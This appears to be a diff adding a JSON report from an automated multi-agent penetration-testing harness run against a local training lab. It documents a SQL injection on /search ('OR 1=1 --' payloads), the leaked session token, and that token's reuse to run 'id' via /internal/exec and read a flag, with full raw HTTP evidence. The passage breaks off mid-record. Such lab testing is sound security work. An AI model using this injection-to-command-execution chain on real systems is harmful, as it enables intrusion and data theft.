@@ -1,0 +1,1074 @@
+{
+  "run_id": "dd8964398777",
+  "target": "http://127.0.0.1:18089",
+  "scenario": "complex-web",
+  "status": "completed",
+  "summary": {
+    "finding_count": 1,
+    "severity_counts": {
+      "high": 1
+    }
+  },
+  "findings": [
+    {
+      "finding_id": "F-001",
+      "title": "SQLite SQL injection with session disclosure",
+      "severity": "high",
+      "description": "Controlled differential in the authorized multi-node complex-web lab leaked an internal session token.",
+      "endpoint": "/search",
+      "evidence": "Baseline/public, fixed positive, and fixed negative GET probes diverged; the positive branch disclosed operator:lab-session-v1.",
+      "remediation": "Use parameterized SQLite queries, hide non-public rows, and keep internal-admin off the public edge.",
+      "cwe": "CWE-89",
+      "confidence": 0.99,
+      "exploitable": true,
+      "source": "complex-web",
+      "metadata": {
+        "knowledge_base": [
+          "CWE-089",
+          "CWE-078",
+          "CWE-798"
+        ],
+        "knowledge_matches": [
+          {
+            "entry_id": "CWE-089",
+            "score": 0.454536,
+            "retrieval": {
+              "method": "tf-idf-cosine",
+              "score": 0.454536,
+              "score_meaning": "Lexical cosine similarity in [0, 1]; not vulnerability confidence or proof.",
+              "matched_terms": [
+                "injection",
+                "sql"
+              ]
+            }
+          },
+          {
+            "entry_id": "CWE-078",
+            "score": 0.196077,
+            "retrieval": {
+              "method": "tf-idf-cosine",
+              "score": 0.196077,
+              "score_meaning": "Lexical cosine similarity in [0, 1]; not vulnerability confidence or proof.",
+              "matched_terms": [
+                "injection"
+              ]
+            }
+          },
+          {
+            "entry_id": "CWE-798",
+            "score": 0.099221,
+            "retrieval": {
+              "method": "tf-idf-cosine",
+              "score": 0.099221,
+              "score_meaning": "Lexical cosine similarity in [0, 1]; not vulnerability confidence or proof.",
+              "matched_terms": [
+                "credential"
+              ]
+            }
+          }
+        ],
+        "evidence_sha256": [
+          "f27ee83cd68e6fdce1813fb554b664e76f48aa82b73db208701dec43aa1c237e",
+          "25c1f5a95e970a0ca5bc9f680e35e3e0c42b293cb7ccdd3d6f79b80f577cfbb5",
+          "686cf59fbf4ec0463a91c7455663d2ca51b1287bd5d457b92731860076c850ca"
+        ],
+        "differential": {
+          "verified": true,
+          "baseline_count": 1,
+          "positive_count": 3,
+          "negative_count": 0,
+          "proof_seen": true,
+          "public_seen": true,
+          "token_seen": true,
+          "positive_sha256": "25c1f5a95e970a0ca5bc9f680e35e3e0c42b293cb7ccdd3d6f79b80f577cfbb5",
+          "negative_sha256": "686cf59fbf4ec0463a91c7455663d2ca51b1287bd5d457b92731860076c850ca",
+          "baseline_sha256": "f27ee83cd68e6fdce1813fb554b664e76f48aa82b73db208701dec43aa1c237e"
+        },
+        "validation": {
+          "status": "verified",
+          "shell_obtained": true,
+          "flag_match": true,
+          "verified": true,
+          "baseline_count": 1,
+          "positive_count": 3,
+          "negative_count": 0,
+          "proof_seen": true,
+          "public_seen": true,
+          "token_seen": true,
+          "positive_sha256": "25c1f5a95e970a0ca5bc9f680e35e3e0c42b293cb7ccdd3d6f79b80f577cfbb5",
+          "negative_sha256": "686cf59fbf4ec0463a91c7455663d2ca51b1287bd5d457b92731860076c850ca",
+          "baseline_sha256": "f27ee83cd68e6fdce1813fb554b664e76f48aa82b73db208701dec43aa1c237e"
+        }
+      }
+    }
+  ],
+  "exploit_results": [
+    {
+      "finding_id": "F-001",
+      "status": "verified",
+      "message": "Fixed GET probes only: SQLi differential, constrained id identity, and ground-truth flag read.",
+      "shell_obtained": true,
+      "flag_match": true
+    }
+  ],
+  "agent_results": [
+    {
+      "agent": "recon",
+      "status": "success",
+      "summary": "probed 8 lab endpoints",
+      "data": {
+        "responses": 8
+      },
+      "errors": [],
+      "observations": [
+        "/",
+        "/login",
+        "/search",
+        "/admin",
+        "/health",
+        "/topology",
+        "/internal/whoami",
+        "/internal/flag"
+      ]
+    },
+    {
+      "agent": "vuln",
+      "status": "success",
+      "summary": "identified 1 findings",
+      "data": {
+        "finding_ids": [
+          "F-001"
+        ]
+      },
+      "errors": [],
+      "observations": [
+        "SQLite SQL injection with session disclosure"
+      ]
+    },
+    {
+      "agent": "exploit",
+      "status": "success",
+      "summary": "validated verified for complex-web chain",
+      "data": {
+        "validated": 1,
+        "status": "verified",
+        "shell_obtained": true,
+        "flag_match": true
+      },
+      "errors": [],
+      "observations": []
+    },
+    {
+      "agent": "report",
+      "status": "success",
+      "summary": "assembled auditable report",
+      "data": {
+        "finding_count": 1
+      },
+      "errors": [],
+      "observations": []
+    }
+  ],
+  "checkpoint": {
+    "schema_version": 1,
+    "path": "C:\\Users\\30588\\Desktop\\小\\out-complex-web-docker\\.checkpoints\\dd8964398777.json",
+    "resumable": true
+  },
+  "test_evidence": {
+    "chain": [
+      "discover",
+      "verify",
+      "constrained-shell-identity",
+      "read-flag"
+    ],
+    "classification": "local-real-complex-web",
+    "shell_obtained": true,
+    "shell_identity": "uid=65532(labuser)",
+    "flag": "FLAG{harness-complex-web-authorized-v1}",
+    "flag_match": true,
+    "flag_sha256": "2ef099f042467dd8b0569655972062e41c15030e00c19ed265086f9b166cc74e",
+    "session_token_seen": true
+  },
+  "facts": {
+    "agent_mode": "auto",
+    "plan": [
+      {
+        "name": "discover attack surface",
+        "agent": "recon",
+        "max_attempts": 2
+      },
+      {
+        "name": "analyze observations",
+        "agent": "vuln",
+        "max_attempts": 2
+      },
+      {
+        "name": "validate in lab",
+        "agent": "exploit",
+        "max_attempts": 2
+      },
+      {
+        "name": "assemble report",
+        "agent": "report",
+        "max_attempts": 2
+      }
+    ],
+    "endpoints": [
+      {
+        "path": "/",
+        "status_code": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.12.13",
+          "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "121",
+          "X-Training-Lab": "harness-mvp-complex",
+          "X-Training-Lab-Version": "complex-web-v1",
+          "X-Lab-Node": "edge-gateway"
+        },
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Complex Web Lab | edge-gateway | authorized local assessment only</body></html>",
+        "latency_ms": 12.574,
+        "source": "complex-web",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 121,
+          "body_sha256": "5807e9e5eb0a2c6358faa60ab901b0516b091dee2ac8aa2a8d203c01edf53c59",
+          "body": "<html><title>Complex Web Lab</title><body>Complex Web Lab | edge-gateway | authorized local assessment only</body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": null,
+          "node": "edge-gateway"
+        }
+      },
+      {
+        "path": "/login",
+        "status_code": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.12.13",
+          "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "66",
+          "X-Training-Lab": "harness-mvp-complex",
+          "X-Training-Lab-Version": "complex-web-v1",
+          "X-Lab-Node": "edge-gateway"
+        },
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Login form</body></html>",
+        "latency_ms": 2.544,
+        "source": "complex-web",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/login",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 66,
+          "body_sha256": "789c79654bd7d4ff5c0908598b4c082be2ca1b90c47ccdb944f47b8d23bdf9a0",
+          "body": "<html><title>Complex Web Lab</title><body>Login form</body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": null,
+          "node": "edge-gateway"
+        }
+      },
+      {
+        "path": "/search",
+        "status_code": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.12.13",
+          "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "105",
+          "X-Training-Lab": "harness-mvp-complex",
+          "X-Training-Lab-Version": "complex-web-v1",
+          "X-Lab-Node": "edge-gateway",
+          "X-Lab-Upstream": "app-api",
+          "X-Lab-Upstream-Status": "200",
+          "X-Lab-Upstream-Node": "app-api"
+        },
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Search results (1): course:public-training-record</body></html>",
+        "latency_ms": 32.12,
+        "source": "complex-web",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/search?q=course",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 105,
+          "body_sha256": "f27ee83cd68e6fdce1813fb554b664e76f48aa82b73db208701dec43aa1c237e",
+          "body": "<html><title>Complex Web Lab</title><body>Search results (1): course:public-training-record</body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": "app-api",
+          "node": "edge-gateway",
+          "query": "q=course"
+        }
+      },
+      {
+        "path": "/admin",
+        "status_code": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.12.13",
+          "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "86",
+          "X-Training-Lab": "harness-mvp-complex",
+          "X-Training-Lab-Version": "complex-web-v1",
+          "X-Lab-Node": "edge-gateway"
+        },
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Admin panel | public edge only</body></html>",
+        "latency_ms": 4.089,
+        "source": "complex-web",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/admin",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 86,
+          "body_sha256": "190b1a713a353352ae4bd0645c09a84b5c51fd578a95837a5b02c0d3d394981a",
+          "body": "<html><title>Complex Web Lab</title><body>Admin panel | public edge only</body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": null,
+          "node": "edge-gateway"
+        }
+      },
+      {
+        "path": "/health",
+        "status_code": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.12.13",
+          "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "58",
+          "X-Training-Lab": "harness-mvp-complex",
+          "X-Training-Lab-Version": "complex-web-v1",
+          "X-Lab-Node": "edge-gateway"
+        },
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>ok</body></html>",
+        "latency_ms": 3.298,
+        "source": "complex-web",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/health",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 58,
+          "body_sha256": "7b9b1ee8f89965f3ff293ed4ecaaa2f67939814d4e72ca695c2fed0cde9643b1",
+          "body": "<html><title>Complex Web Lab</title><body>ok</body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": null,
+          "node": "edge-gateway"
+        }
+      },
+      {
+        "path": "/topology",
+        "status_code": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.12.13",
+          "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "138",
+          "X-Training-Lab": "harness-mvp-complex",
+          "X-Training-Lab-Version": "complex-web-v1",
+          "X-Lab-Node": "edge-gateway"
+        },
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>nodes=edge-gateway,app-api,internal-admin network=labnet flag_store=internal-admin</body></html>",
+        "latency_ms": 3.815,
+        "source": "complex-web",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/topology",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 138,
+          "body_sha256": "faeaadcb80ddd662ff17662c1f00f5562a347c51f779d6dd21e47264f55ff668",
+          "body": "<html><title>Complex Web Lab</title><body>nodes=edge-gateway,app-api,internal-admin network=labnet flag_store=internal-admin</body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": null,
+          "node": "edge-gateway"
+        }
+      },
+      {
+        "path": "/internal/whoami",
+        "status_code": 401,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.12.13",
+          "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "72",
+          "X-Training-Lab": "harness-mvp-complex",
+          "X-Training-Lab-Version": "complex-web-v1",
+          "X-Lab-Node": "edge-gateway",
+          "X-Lab-Upstream": "internal-admin",
+          "X-Lab-Upstream-Status": "401",
+          "X-Lab-Upstream-Node": "internal-admin"
+        },
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>session required</body></html>",
+        "latency_ms": 13.317,
+        "source": "complex-web",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/internal/whoami",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 72,
+          "body_sha256": "2e614245ec83724a18ba9a850224058b367875dc2e148786511d04bea047b963",
+          "body": "<html><title>Complex Web Lab</title><body>session required</body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": "internal-admin",
+          "node": "edge-gateway"
+        }
+      },
+      {
+        "path": "/internal/flag",
+        "status_code": 401,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.12.13",
+          "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "72",
+          "X-Training-Lab": "harness-mvp-complex",
+          "X-Training-Lab-Version": "complex-web-v1",
+          "X-Lab-Node": "edge-gateway",
+          "X-Lab-Upstream": "internal-admin",
+          "X-Lab-Upstream-Status": "401",
+          "X-Lab-Upstream-Node": "internal-admin"
+        },
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>session required</body></html>",
+        "latency_ms": 9.21,
+        "source": "complex-web",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/internal/flag",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 72,
+          "body_sha256": "2e614245ec83724a18ba9a850224058b367875dc2e148786511d04bea047b963",
+          "body": "<html><title>Complex Web Lab</title><body>session required</body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": "internal-admin",
+          "node": "edge-gateway"
+        }
+      }
+    ],
+    "raw_evidence": [
+      {
+        "path": "/",
+        "status_code": 200,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Complex Web Lab | edge-gateway | authorized local assessment only</body></html>",
+        "body_sha256": "5807e9e5eb0a2c6358faa60ab901b0516b091dee2ac8aa2a8d203c01edf53c59",
+        "source": "complex-web"
+      },
+      {
+        "path": "/login",
+        "status_code": 200,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Login form</body></html>",
+        "body_sha256": "789c79654bd7d4ff5c0908598b4c082be2ca1b90c47ccdb944f47b8d23bdf9a0",
+        "source": "complex-web"
+      },
+      {
+        "path": "/search",
+        "status_code": 200,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Search results (1): course:public-training-record</body></html>",
+        "body_sha256": "f27ee83cd68e6fdce1813fb554b664e76f48aa82b73db208701dec43aa1c237e",
+        "source": "complex-web"
+      },
+      {
+        "path": "/admin",
+        "status_code": 200,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Admin panel | public edge only</body></html>",
+        "body_sha256": "190b1a713a353352ae4bd0645c09a84b5c51fd578a95837a5b02c0d3d394981a",
+        "source": "complex-web"
+      },
+      {
+        "path": "/health",
+        "status_code": 200,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>ok</body></html>",
+        "body_sha256": "7b9b1ee8f89965f3ff293ed4ecaaa2f67939814d4e72ca695c2fed0cde9643b1",
+        "source": "complex-web"
+      },
+      {
+        "path": "/topology",
+        "status_code": 200,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>nodes=edge-gateway,app-api,internal-admin network=labnet flag_store=internal-admin</body></html>",
+        "body_sha256": "faeaadcb80ddd662ff17662c1f00f5562a347c51f779d6dd21e47264f55ff668",
+        "source": "complex-web"
+      },
+      {
+        "path": "/internal/whoami",
+        "status_code": 401,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>session required</body></html>",
+        "body_sha256": "2e614245ec83724a18ba9a850224058b367875dc2e148786511d04bea047b963",
+        "source": "complex-web"
+      },
+      {
+        "path": "/internal/flag",
+        "status_code": 401,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>session required</body></html>",
+        "body_sha256": "2e614245ec83724a18ba9a850224058b367875dc2e148786511d04bea047b963",
+        "source": "complex-web"
+      }
+    ],
+    "reachable": true,
+    "complex_sqli_validation": {
+      "baseline": {
+        "status_code": 200,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Search results (1): course:public-training-record</body></html>",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/search?q=course",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 105,
+          "body_sha256": "f27ee83cd68e6fdce1813fb554b664e76f48aa82b73db208701dec43aa1c237e",
+          "body": "<html><title>Complex Web Lab</title><body>Search results (1): course:public-training-record</body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": "app-api",
+          "node": "edge-gateway",
+          "query": "q=course"
+        }
+      },
+      "positive": {
+        "status_code": 200,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Search results (3): course:public-training-record, operator:lab-session-v1, alice:course-proof-complex-v1</body></html>",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/search?q=%27+OR+1%3D1+--",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 161,
+          "body_sha256": "25c1f5a95e970a0ca5bc9f680e35e3e0c42b293cb7ccdd3d6f79b80f577cfbb5",
+          "body": "<html><title>Complex Web Lab</title><body>Search results (3): course:public-training-record, operator:lab-session-v1, alice:course-proof-complex-v1</body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": "app-api",
+          "node": "edge-gateway",
+          "query": "q=%27+OR+1%3D1+--"
+        }
+      },
+      "negative": {
+        "status_code": 200,
+        "body_excerpt": "<html><title>Complex Web Lab</title><body>Search results (0): </body></html>",
+        "metadata": {
+          "target": "http://127.0.0.1:18089",
+          "request_url": "http://127.0.0.1:18089/search?q=%27+AND+1%3D0+--",
+          "method": "GET",
+          "request_headers": {
+            "X-Harness-Client": "harness-mvp"
+          },
+          "evidence_bytes": 76,
+          "body_sha256": "686cf59fbf4ec0463a91c7455663d2ca51b1287bd5d457b92731860076c850ca",
+          "body": "<html><title>Complex Web Lab</title><body>Search results (0): </body></html>",
+          "evidence_scope": "authorized-local-complex-web",
+          "upstream": "app-api",
+          "node": "edge-gateway",
+          "query": "q=%27+AND+1%3D0+--"
+        }
+      }
+    },
+    "complex_sqli_differential": {
+      "verified": true,
+      "baseline_count": 1,
+      "positive_count": 3,
+      "negative_count": 0,
+      "proof_seen": true,
+      "public_seen": true,
+      "token_seen": true,
+      "positive_sha256": "25c1f5a95e970a0ca5bc9f680e35e3e0c42b293cb7ccdd3d6f79b80f577cfbb5",
+      "negative_sha256": "686cf59fbf4ec0463a91c7455663d2ca51b1287bd5d457b92731860076c850ca",
+      "baseline_sha256": "f27ee83cd68e6fdce1813fb554b664e76f48aa82b73db208701dec43aa1c237e"
+    },
+    "complex_chain": {
+      "verified": true,
+      "status": "verified",
+      "differential": {
+        "verified": true,
+        "baseline_count": 1,
+        "positive_count": 3,
+        "negative_count": 0,
+        "proof_seen": true,
+        "public_seen": true,
+        "token_seen": true,
+        "positive_sha256": "25c1f5a95e970a0ca5bc9f680e35e3e0c42b293cb7ccdd3d6f79b80f577cfbb5",
+        "negative_sha256": "686cf59fbf4ec0463a91c7455663d2ca51b1287bd5d457b92731860076c850ca",
+        "baseline_sha256": "f27ee83cd68e6fdce1813fb554b664e76f48aa82b73db208701dec43aa1c237e"
+      },
+      "session_token_seen": true,
+      "shell_identity": "uid=65532(labuser)",
+      "shell_obtained": true,
+      "flag": "FLAG{harness-complex-web-authorized-v1}",
+      "flag_expected": "FLAG{harness-complex-web-authorized-v1}",
+      "flag_match": true,
+      "flag_sha256": "2ef099f042467dd8b0569655972062e41c15030e00c19ed265086f9b166cc74e",
+      "raw_http": [
+        {
+          "step": "sqli-baseline",
+          "request": {
+            "method": "GET",
+            "url": "http://127.0.0.1:18089/search?q=course",
+            "headers": {
+              "X-Harness-Client": "harness-mvp"
+            }
+          },
+          "response": {
+            "status_code": 200,
+            "headers": {
+              "Server": "BaseHTTP/0.6 Python/3.12.13",
+              "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+              "Content-Type": "text/html; charset=utf-8",
+              "Content-Length": "105",
+              "X-Training-Lab": "harness-mvp-complex",
+              "X-Training-Lab-Version": "complex-web-v1",
+              "X-Lab-Node": "edge-gateway",
+              "X-Lab-Upstream": "app-api",
+              "X-Lab-Upstream-Status": "200",
+              "X-Lab-Upstream-Node": "app-api"
+            },
+            "body": "<html><title>Complex Web Lab</title><body>Search results (1): course:public-training-record</body></html>",
+            "sha256": "f27ee83cd68e6fdce1813fb554b664e76f48aa82b73db208701dec43aa1c237e"
+          }
+        },
+        {
+          "step": "sqli-positive",
+          "request": {
+            "method": "GET",
+            "url": "http://127.0.0.1:18089/search?q=%27+OR+1%3D1+--",
+            "headers": {
+              "X-Harness-Client": "harness-mvp"
+            }
+          },
+          "response": {
+            "status_code": 200,
+            "headers": {
+              "Server": "BaseHTTP/0.6 Python/3.12.13",
+              "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+              "Content-Type": "text/html; charset=utf-8",
+              "Content-Length": "161",
+              "X-Training-Lab": "harness-mvp-complex",
+              "X-Training-Lab-Version": "complex-web-v1",
+              "X-Lab-Node": "edge-gateway",
+              "X-Lab-Upstream": "app-api",
+              "X-Lab-Upstream-Status": "200",
+              "X-Lab-Upstream-Node": "app-api"
+            },
+            "body": "<html><title>Complex Web Lab</title><body>Search results (3): course:public-training-record, operator:lab-session-v1, alice:course-proof-complex-v1</body></html>",
+            "sha256": "25c1f5a95e970a0ca5bc9f680e35e3e0c42b293cb7ccdd3d6f79b80f577cfbb5"
+          }
+        },
+        {
+          "step": "sqli-negative",
+          "request": {
+            "method": "GET",
+            "url": "http://127.0.0.1:18089/search?q=%27+AND+1%3D0+--",
+            "headers": {
+              "X-Harness-Client": "harness-mvp"
+            }
+          },
+          "response": {
+            "status_code": 200,
+            "headers": {
+              "Server": "BaseHTTP/0.6 Python/3.12.13",
+              "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+              "Content-Type": "text/html; charset=utf-8",
+              "Content-Length": "76",
+              "X-Training-Lab": "harness-mvp-complex",
+              "X-Training-Lab-Version": "complex-web-v1",
+              "X-Lab-Node": "edge-gateway",
+              "X-Lab-Upstream": "app-api",
+              "X-Lab-Upstream-Status": "200",
+              "X-Lab-Upstream-Node": "app-api"
+            },
+            "body": "<html><title>Complex Web Lab</title><body>Search results (0): </body></html>",
+            "sha256": "686cf59fbf4ec0463a91c7455663d2ca51b1287bd5d457b92731860076c850ca"
+          }
+        },
+        {
+          "step": "shell-whoami",
+          "request": {
+            "method": "GET",
+            "url": "http://127.0.0.1:18089/internal/whoami",
+            "headers": {
+              "X-Harness-Client": "harness-mvp",
+              "X-Lab-Session": "lab-session-v1"
+            }
+          },
+          "response": {
+            "status_code": 200,
+            "headers": {
+              "Server": "BaseHTTP/0.6 Python/3.12.13",
+              "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+              "Content-Type": "text/html; charset=utf-8",
+              "Content-Length": "151",
+              "X-Training-Lab": "harness-mvp-complex",
+              "X-Training-Lab-Version": "complex-web-v1",
+              "X-Lab-Node": "edge-gateway",
+              "X-Lab-Upstream": "internal-admin",
+              "X-Lab-Upstream-Status": "200",
+              "X-Lab-Upstream-Node": "internal-admin"
+            },
+            "body": "<html><title>Complex Web Lab</title><body>uid=65532(labuser) gid=65532(labuser) groups=65532(labuser) tty=lab-console host=internal-admin</body></html>",
+            "sha256": "ae823ed3e5e9439a18311431b9fe871e899c74fff7e33f6ce130906a52cf8f3f"
+          }
+        },
+        {
+          "step": "shell-exec-id",
+          "request": {
+            "method": "GET",
+            "url": "http://127.0.0.1:18089/internal/exec?cmd=id",
+            "headers": {
+              "X-Harness-Client": "harness-mvp",
+              "X-Lab-Session": "lab-session-v1"
+            }
+          },
+          "response": {
+            "status_code": 200,
+            "headers": {
+              "Server": "BaseHTTP/0.6 Python/3.12.13",
+              "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+              "Content-Type": "text/html; charset=utf-8",
+              "Content-Length": "151",
+              "X-Training-Lab": "harness-mvp-complex",
+              "X-Training-Lab-Version": "complex-web-v1",
+              "X-Lab-Node": "edge-gateway",
+              "X-Lab-Upstream": "internal-admin",
+              "X-Lab-Upstream-Status": "200",
+              "X-Lab-Upstream-Node": "internal-admin"
+            },
+            "body": "<html><title>Complex Web Lab</title><body>uid=65532(labuser) gid=65532(labuser) groups=65532(labuser) tty=lab-console host=internal-admin</body></html>",
+            "sha256": "ae823ed3e5e9439a18311431b9fe871e899c74fff7e33f6ce130906a52cf8f3f"
+          }
+        },
+        {
+          "step": "read-flag",
+          "request": {
+            "method": "GET",
+            "url": "http://127.0.0.1:18089/internal/flag",
+            "headers": {
+              "X-Harness-Client": "harness-mvp",
+              "X-Lab-Session": "lab-session-v1"
+            }
+          },
+          "response": {
+            "status_code": 200,
+            "headers": {
+              "Server": "BaseHTTP/0.6 Python/3.12.13",
+              "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+              "Content-Type": "text/html; charset=utf-8",
+              "Content-Length": "95",
+              "X-Training-Lab": "harness-mvp-complex",
+              "X-Training-Lab-Version": "complex-web-v1",
+              "X-Lab-Node": "edge-gateway",
+              "X-Lab-Upstream": "internal-admin",
+              "X-Lab-Upstream-Status": "200",
+              "X-Lab-Upstream-Node": "internal-admin"
+            },
+            "body": "<html><title>Complex Web Lab</title><body>FLAG{harness-complex-web-authorized-v1}</body></html>",
+            "sha256": "bffe677372c43fd99447ed113c7cccc831a786b81f065cbde8fd6051c01395e2"
+          }
+        }
+      ],
+      "probes": {
+        "whoami": {
+          "path": "/internal/whoami",
+          "status_code": 200,
+          "body_excerpt": "<html><title>Complex Web Lab</title><body>uid=65532(labuser) gid=65532(labuser) groups=65532(labuser) tty=lab-console host=internal-admin</body></html>",
+          "body_sha256": "ae823ed3e5e9439a18311431b9fe871e899c74fff7e33f6ce130906a52cf8f3f",
+          "request_url": "http://127.0.0.1:18089/internal/whoami"
+        },
+        "exec": {
+          "path": "/internal/exec",
+          "status_code": 200,
+          "body_excerpt": "<html><title>Complex Web Lab</title><body>uid=65532(labuser) gid=65532(labuser) groups=65532(labuser) tty=lab-console host=internal-admin</body></html>",
+          "body_sha256": "ae823ed3e5e9439a18311431b9fe871e899c74fff7e33f6ce130906a52cf8f3f",
+          "request_url": "http://127.0.0.1:18089/internal/exec?cmd=id"
+        },
+        "flag": {
+          "path": "/internal/flag",
+          "status_code": 200,
+          "body_excerpt": "<html><title>Complex Web Lab</title><body>FLAG{harness-complex-web-authorized-v1}</body></html>",
+          "body_sha256": "bffe677372c43fd99447ed113c7cccc831a786b81f065cbde8fd6051c01395e2",
+          "request_url": "http://127.0.0.1:18089/internal/flag"
+        }
+      }
+    },
+    "raw_http_evidence": [
+      {
+        "step": "sqli-baseline",
+        "request": {
+          "method": "GET",
+          "url": "http://127.0.0.1:18089/search?q=course",
+          "headers": {
+            "X-Harness-Client": "harness-mvp"
+          }
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Server": "BaseHTTP/0.6 Python/3.12.13",
+            "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+            "Content-Type": "text/html; charset=utf-8",
+            "Content-Length": "105",
+            "X-Training-Lab": "harness-mvp-complex",
+            "X-Training-Lab-Version": "complex-web-v1",
+            "X-Lab-Node": "edge-gateway",
+            "X-Lab-Upstream": "app-api",
+            "X-Lab-Upstream-Status": "200",
+            "X-Lab-Upstream-Node": "app-api"
+          },
+          "body": "<html><title>Complex Web Lab</title><body>Search results (1): course:public-training-record</body></html>",
+          "sha256": "f27ee83cd68e6fdce1813fb554b664e76f48aa82b73db208701dec43aa1c237e"
+        }
+      },
+      {
+        "step": "sqli-positive",
+        "request": {
+          "method": "GET",
+          "url": "http://127.0.0.1:18089/search?q=%27+OR+1%3D1+--",
+          "headers": {
+            "X-Harness-Client": "harness-mvp"
+          }
+        },
+        "response": {
+          "status_code": 200,
+          "headers": {
+            "Server": "BaseHTTP/0.6 Python/3.12.13",
+            "Date": "Thu, 10 Sep 2026 05:36:13 GMT",
+            "Content-Type": "text/html; charset=utf-8",
+            "Content-Length": "161",
+            "X-Training-Lab": "harness-mvp-complex",
+            "X-Training-Lab-Version": "complex-web-v1",
+            "X-Lab-Node": "edge-gateway",
+            "X-Lab-Upstream": "app-api",
+            "X-Lab-Upstream-Status": "200",
+            "X-Lab-Upstream-Node": "app-api"
+          },
+          "body": "<html><title>Complex Web Lab</title><body>Search results (3): course:public-training-record, operator:lab-session-v1, alice:course-proof-complex-v1</body></html>",
